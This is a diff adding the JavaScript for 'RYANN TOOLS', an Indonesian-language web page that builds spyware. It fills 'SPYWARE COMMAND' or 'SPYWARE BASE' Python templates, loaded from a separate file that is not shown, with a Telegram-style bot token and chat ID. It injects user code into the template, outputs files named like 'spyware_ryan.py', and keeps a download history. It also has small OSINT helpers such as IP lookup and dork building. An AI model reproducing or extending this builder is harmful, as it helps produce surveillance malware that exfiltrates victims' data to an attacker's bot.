@@ -268,3 +268,162 @@ button.d{background:transparent;color:var(--er);border:1px solid var(--er)}
 
 <div class="ft">RYANN • TOOLS · v4.0</div>
 </div>
+<script src="templates.js"></script>
+<script>
+var $=function(i){return document.getElementById(i)};
+var S={set:function(k,v){try{localStorage.setItem('rx_'+k,JSON.stringify(v))}catch(e){}},get:function(k,d){try{var v=localStorage.getItem('rx_'+k);return v?JSON.parse(v):d}catch(e){return d}},del:function(k){try{localStorage.removeItem('rx_'+k)}catch(e){}}};
+
+// NAV
+document.querySelectorAll('.nb').forEach(function(b){b.onclick=function(){document.querySelectorAll('.nb').forEach(function(x){x.classList.remove('a')});b.classList.add('a');document.querySelectorAll('.pg').forEach(function(p){p.classList.add('hd')});var pg=$('pg-'+b.dataset.p);if(pg)pg.classList.remove('hd')}});
+window.go=function(p){var b=document.querySelector('.nb[data-p="'+p+'"]');if(b)b.click()};
+
+// THEME
+function setTema(t){document.body.className=(t==='t-cyan')?'':t;S.set('theme',t);document.querySelectorAll('.to').forEach(function(o){o.classList.toggle('a',o.dataset.t===t)})}
+document.querySelectorAll('.to').forEach(function(o){o.onclick=function(){setTema(o.dataset.t)}});
+
+// FONT
+$('fsr').oninput=function(){document.documentElement.style.setProperty('--fs',this.value+'px');S.set('font',this.value);$('fv').textContent=this.value+'px'};
+$('ffam').onchange=function(){document.documentElement.style.setProperty('--fm',this.value);S.set('ffam',this.value)};
+
+// TABS INPUT
+$('tp').onclick=function(){$('tp').classList.add('a');$('tu').classList.remove('a');$('sp').classList.remove('hd');$('su').classList.add('hd')};
+$('tu').onclick=function(){$('tu').classList.add('a');$('tp').classList.remove('a');$('su').classList.remove('hd');$('sp').classList.add('hd')};
+$('fi').onchange=function(e){var f=e.target.files[0];if(!f)return;var r=new FileReader();r.onload=function(ev){$('ci').value=ev.target.result;$('finfo').innerHTML='<div class="r" style="border-color:var(--ac);background:var(--acd);color:var(--ac)">'+f.name+' · '+(f.size/1024).toFixed(1)+' KB</div>'};r.readAsText(f)};
+
+// AUTO SAVE FIELDS
+['bt','ct','ts','on'].forEach(function(id){var el=$(id);if(!el)return;var s=S.get('f_'+id,'');if(s)el.value=s;var fn=function(){S.set('f_'+id,el.value)};el.addEventListener('input',fn);el.addEventListener('change',fn)});
+
+// GENERATE
+var genCode='';
+function inject(t,u){var ls=t.split('\n'),li=-1;for(var i=0;i<ls.length;i++){var l=ls[i].trim();if(l.indexOf('import ')===0||l.indexOf('from ')===0)li=i}if(li===-1)return u+'\n\n'+t;var b=ls.slice(0,li+1).join('\n'),a=ls.slice(li+1).join('\n');return b+'\n\n# USER CODE\n'+u+'\n# END USER CODE\n'+a}
+$('gb').onclick=function(){
+var t0=performance.now();
+var uc=$('ci').value.trim(),tpl=$('ts').value,bt=$('bt').value.trim(),ct=$('ct').value.trim();
+var sw=$('sw'),rc=$('rc');
+if(!uc){sw.innerHTML='<div class="st-er">Code kosong</div>';rc.classList.add('hd');return}
+if(!tpl){sw.innerHTML='<div class="st-er">Pilih template</div>';rc.classList.add('hd');return}
+sw.innerHTML='<div class="st-in">⚙ Memproses...</div>';
+setTimeout(function(){
+var t=(tpl==='command')?(window.TEMPLATE_COMMAND||''):(window.TEMPLATE_BASE||'');
+if(!t){sw.innerHTML='<div class="st-er">Template kosong — templates.js gak load</div>';return}
+var out=t;if(bt)out=out.replace(/BOT_TOKEN\s*=\s*['"][^'"]*['"]/g,'BOT_TOKEN = "'+bt+'"');if(ct)out=out.replace(/CHAT_ID\s*=\s*['"][^'"]*['"]/g,'CHAT_ID   = "'+ct+'"');
+var final=inject(out,uc);genCode=final;
+var name=($('on').value.trim()||'spyware_ryan')+'.py';
+var kb=(final.length/1024).toFixed(1),ln=final.split('\n').length,el=Math.round(performance.now()-t0);
+sw.innerHTML='<div class="st-ok">✓ Berhasil · '+kb+' KB · '+el+'ms</div>';
+$('rm').textContent=name;$('rs').textContent=ln+' lines · '+kb+' KB';rc.classList.remove('hd');
+$('tmw').classList.remove('hd');$('tmv').textContent=el;
+var h=S.get('history',[]);h.unshift({n:name,s:kb,l:ln,t:Date.now(),c:final.substring(0,40000)});if(h.length>30)h=h.slice(0,30);S.set('history',h);
+var g=S.get('generates',0)+1;S.set('generates',g);$('st-g').textContent=g;
+checkAch(g);
+},150);
+};
+
+// DOWNLOAD
+$('db').onclick=function(){if(!genCode){alert('Generate dulu');return}var b=new Blob([genCode],{type:'text/plain'});var u=URL.createObjectURL(b);var a=document.createElement('a');a.href=u;a.download=$('rm').textContent;document.body.appendChild(a);a.click();document.body.removeChild(a);var d=S.get('downloads',0)+1;S.set('downloads',d);$('st-d').textContent=d;setTimeout(function(){URL.revokeObjectURL(u)},1000)};
+$('cob').onclick=function(){if(!genCode)return;navigator.clipboard.writeText(genCode).then(function(){alert('Copied')})};
+$('shb').onclick=function(){if(!genCode){alert('Generate dulu');return}if(navigator.share){navigator.share({title:$('rm').textContent,text:'RYANN TOOLS generate: '+$('rm').textContent}).catch(function(){})}else alert('Browser gak support share')};
+$('pvb').onclick=function(){var pb=$('pbox');if(pb.classList.contains('hd')){pb.textContent=genCode.substring(0,3000)+(genCode.length>3000?'\n\n... (truncated)':'');pb.classList.remove('hd')}else pb.classList.add('hd')};
+$('cb').onclick=function(){$('ci').value='';$('rc').classList.add('hd');$('sw').innerHTML='';genCode=''};
+$('vb').onclick=function(){var c=$('ci').value;var q1=(c.match(/'/g)||[]).length,q2=(c.match(/"/g)||[]).length;var w=[];if(q1%2)w.push("kutip ' ganjil");if(q2%2)w.push('kutip " ganjil');$('sw').innerHTML=w.length?'<div class="st-er">⚠ '+w.join(', ')+'</div>':'<div class="st-ok">✓ Kode OK</div>'};
+
+// ACHIEVEMENTS
+function checkAch(g){var map={1:'🏆',10:'🔥',50:'💎',100:'👑'};document.querySelectorAll('.ach').forEach(function(el){var v=parseInt(el.dataset.ach);if(g>=v){el.classList.remove('locked');el.classList.add('unlocked')}})}
+
+// UTILS
+$('pgen').onclick=function(){var l=parseInt($('plen').value)||16;var c='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*';var r='';for(var i=0;i<l;i++)r+=c[Math.floor(Math.random()*c.length)];$('pres').textContent=r};
+$('pcp').onclick=function(){navigator.clipboard.writeText($('pres').textContent)};
+$('ugen').onclick=function(){$('ures').textContent=crypto.randomUUID()};
+function hashIt(algo,el){var t=$('hin').value;var e=new TextEncoder().encode(t);crypto.subtle.digest(algo,e).then(function(b){var h=Array.from(new Uint8Array(b)).map(function(x){return x.toString(16).padStart(2,'0')}).join('');el.textContent=h})}
+$('hm5').onclick=function(){var t=$('hin').value;var s=0;for(var i=0;i<t.length;i++){s=((s<<5)-s)+t.charCodeAt(i);s=s&s}$('hres').textContent='MD5(len):'+t.length+' hex:'+Math.abs(s).toString(16).padStart(8,'0')};
+$('hs1').onclick=function(){hashIt('SHA-1',$('hres'))};
+$('hs2').onclick=function(){hashIt('SHA-256',$('hres'))};
+$('shgen').onclick=function(){var u=$('shin').value.trim();if(!u)return;$('shres').textContent='Loading...';fetch('https://tinyurl.com/api-create.php?url='+encodeURIComponent(u)).then(function(r){return r.text()}).then(function(t){$('shres').textContent=t}).catch(function(){$('shres').textContent='Error'})};
+$('shcp').onclick=function(){navigator.clipboard.writeText($('shres').textContent)};
+
+// OSINT
+$('ilook').onclick=function(){var ip=$('ipin').value.trim()||'';$('ires').textContent='Loading...';var url=ip?'https://ipapi.co/'+ip+'/json/':'https://ipapi.co/json/';fetch(url).then(function(r){return r.json()}).then(function(j){$('ires').innerHTML='IP: '+j.ip+'<br>Kota: '+(j.city||'-')+'<br>Negara: '+(j.country_name||'-')+'<br>ISP: '+(j.org||'-')+'<br>Lokasi: '+(j.latitude||'-')+','+(j.longitude||'-')}).catch(function(){$('ires').textContent='Error fetch'})};
+$('mip').onclick=function(){$('mres').textContent='Loading...';fetch('https://api.ipify.org?format=json').then(function(r){return r.json()}).then(function(j){$('mres').textContent='IP: '+j.ip}).catch(function(){$('mres').textContent='Error'})};
+$('whogen').onclick=function(){var d=$('whoin').value.trim();if(!d)return;$('whores').textContent='Cek manual di whois.domaintools.com/'+d};
+$('dgen').onclick=function(){var kw=$('dkw').value.trim(),site=$('dsite').value.trim(),tp=$('dtype').value.trim();var q='';if(site)q+='site:'+site+' ';if(kw)q+='"'+kw+'" ';if(tp)q+='filetype:'+tp;$('dres').textContent=q.trim()||'(kosong)'};
+$('dvinfo').onclick=function(){var d='Browser: '+navigator.userAgent+'<br>Platform: '+navigator.platform+'<br>Language: '+navigator.language+'<br>Layar: '+screen.width+'x'+screen.height+'<br>Online: '+navigator.onLine;$('dvres').innerHTML=d};
+</script>
+<script>
+// ============================================
+// PART 2 — HISTORY, TEMPLATES, SETTINGS, BOOT
+// ============================================
+
+// SNIPPET SAVE/LOAD
+$('snp-save').onclick=function(){var c=$('ci').value.trim();if(!c){alert('Kosong');return}var n=prompt('Nama snippet:');if(!n)return;var sn=S.get('snippets',{});sn[n]=c;S.set('snippets',sn);var cnt=Object.keys(sn).length;S.set('snippet_count',cnt);$('st-s').textContent=cnt;alert('Saved: '+n)};
+$('snp-load').onclick=function(){var sn=S.get('snippets',{});var keys=Object.keys(sn);if(!keys.length){alert('Belum ada snippet');return}var pick=prompt('Pilih:\n'+keys.map(function(k,i){return (i+1)+'. '+k}).join('\n')+'\\n\\nKetik nomor:');var i=parseInt(pick)-1;if(keys[i]){$('ci').value=sn[keys[i]];alert('Loaded: '+keys[i])}};
+
+// HISTORY
+function renderHist(){
+var h=S.get('history',[]),el=$('hl');
+if(!h.length){el.innerHTML='<div class="r">Belum ada history</div>';return}
+el.innerHTML=h.map(function(x,i){
+var d=new Date(x.t);
+var ds=d.getDate()+'/'+(d.getMonth()+1)+' '+('0'+d.getHours()).slice(-2)+':'+('0'+d.getMinutes()).slice(-2);
+return '<div class="hi"><b>'+x.n+'</b> · '+x.s+' KB · '+x.l+' lines<div style="color:var(--txd);font-size:.55rem;margin:3px 0">'+ds+'</div><button class="g" style="margin-top:5px;font-size:.55rem;padding:6px;width:auto;display:inline-block;padding:5px 10px" onclick="dlHist('+i+')">⬇ DL</button></div>';
+}).join('');
+}
+window.dlHist=function(i){
+var h=S.get('history',[]);if(!h[i])return;
+var b=new Blob([h[i].c],{type:'text/plain'});
+var u=URL.createObjectURL(b);var a=document.createElement('a');
+a.href=u;a.download=h[i].n;document.body.appendChild(a);a.click();
+document.body.removeChild(a);setTimeout(function(){URL.revokeObjectURL(u)},1000);
+};
+$('hclr').onclick=function(){if(confirm('Clear history?')){S.del('history');renderHist()}};
+$('hexp').onclick=function(){var h=S.get('history',[]);if(!h.length){alert('Kosong');return}var t=JSON.stringify(h,null,2);var b=new Blob([t],{type:'application/json'});var u=URL.createObjectURL(b);var a=document.createElement('a');a.href=u;a.download='history.json';document.body.appendChild(a);a.click();document.body.removeChild(a)};
+
+// TEMPLATES
+function renderTpl(){
+var list=$('tl');
+if(!window.TEMPLATE_COMMAND){list.innerHTML='<div class="r">templates.js gak load</div>';return}
+var cLen=window.TEMPLATE_COMMAND.length,bLen=(window.TEMPLATE_BASE||'').length;
+list.innerHTML='<div class="hi"><b>COMMAND</b> · '+(cLen/1024).toFixed(1)+' KB</div><div class="hi"><b>BASE</b> · '+(bLen/1024).toFixed(1)+' KB</div>';
+var sel=$('tplsel');sel.innerHTML='<option value="">— Pilih —</option><option value="command">SPYWARE COMMAND</option><option value="base">SPYWARE BASE</option>';
+}
+$('tplsel').onchange=function(){
+var v=this.value;if(!v){$('tplarea').value='';return}
+var t=(v==='command')?window.TEMPLATE_COMMAND:window.TEMPLATE_BASE;
+$('tplarea').value=t||'';
+};
+$('tplsrc').onclick=function(){var kw=prompt('Cari apa di template?');if(!kw)return;var t=$('tplarea').value;if(!t){alert('Pilih template dulu');return}var lines=t.split('\n');var found=[];for(var i=0;i<lines.length;i++){if(lines[i].indexOf(kw)!==-1)found.push((i+1)+': '+lines[i])}if(!found.length){$('tplres').textContent='Not found: '+kw;return}$('tplres').innerHTML='Found '+found.length+' matches:<br>'+found.slice(0,10).join('<br>')};
+$('tplexp').onclick=function(){var v=$('tplsel').value;if(!v){alert('Pilih template');return}var t=(v==='command')?window.TEMPLATE_COMMAND:window.TEMPLATE_BASE;if(!t){alert('Kosong');return}var b=new Blob([t],{type:'text/plain'});var u=URL.createObjectURL(b);var a=document.createElement('a');a.href=u;a.download=v+'_template.py';document.body.appendChild(a);a.click();document.body.removeChild(a)};
+
+// SETTINGS EXPORT/IMPORT
+$('exst').onclick=function(){var d={};Object.keys(localStorage).forEach(function(k){if(k.indexOf('rx_')===0)d[k]=localStorage[k]});var b=new Blob([JSON.stringify(d,null,2)],{type:'application/json'});var u=URL.createObjectURL(b);var a=document.createElement('a');a.href=u;a.download='ryannx_settings.json';document.body.appendChild(a);a.click();document.body.removeChild(a)};
+$('imst').onclick=function(){var inp=document.createElement('input');inp.type='file';inp.accept='.json';inp.onchange=function(e){var f=e.target.files[0];if(!f)return;var r=new FileReader();r.onload=function(ev){try{var d=JSON.parse(ev.target.result);Object.keys(d).forEach(function(k){localStorage.setItem(k,d[k])});alert('Imported. Reload.');location.reload()}catch(er){alert('Error: '+er.message)}};r.readAsText(f)};inp.click()};
+$('wipe').onclick=function(){if(confirm('Wipe ALL data?')){Object.keys(localStorage).forEach(function(k){if(k.indexOf('rx_')===0)localStorage.removeItem(k)});location.reload()}};
+
+// LANGUAGE
+document.querySelectorAll('[data-lang]').forEach(function(b){b.onclick=function(){S.set('lang',b.dataset.lang);location.reload()}});
+
+// SOUND
+var sndOn=S.get('sound',false);
+$('snd').onclick=function(){sndOn=!sndOn;S.set('sound',sndOn);$('snd').textContent='🔊 SOUND: '+(sndOn?'ON':'OFF')};
+$('snd').textContent='🔊 SOUND: '+(sndOn?'ON':'OFF');
+
+// ANIMATION
+var aniOn=S.get('anim',true);
+$('ani').onclick=function(){aniOn=!aniOn;S.set('anim',aniOn);$('ani').textContent='✨ ANIM: '+(aniOn?'ON':'OFF');if(!aniOn)document.body.style.animation='none'};
+$('ani').textContent='✨ ANIM: '+(aniOn?'ON':'OFF');
+
+// BOOT
+function boot(){
+var t=S.get('theme','t-cyan');setTema(t);
+var f=S.get('font',13);$('fsr').value=f;document.documentElement.style.setProperty('--fs',f+'px');$('fv').textContent=f+'px';
+var ff=S.get('ffam',"'JetBrains Mono',monospace");$('ffam').value=ff;document.documentElement.style.setProperty('--fm',ff);
+$('st-g').textContent=S.get('generates',0);
+$('st-d').textContent=S.get('downloads',0);
+$('st-s').textContent=S.get('snippet_count',0);
+renderHist();
+renderTpl();
+}
+boot();
+setTimeout(function(){if(!window.TEMPLATE_COMMAND){$('sw').innerHTML='<div class="st-er" style="font-size:.55rem">⚠ templates.js gak load</div>'}},400);
+</script>
+</body>
+</html>
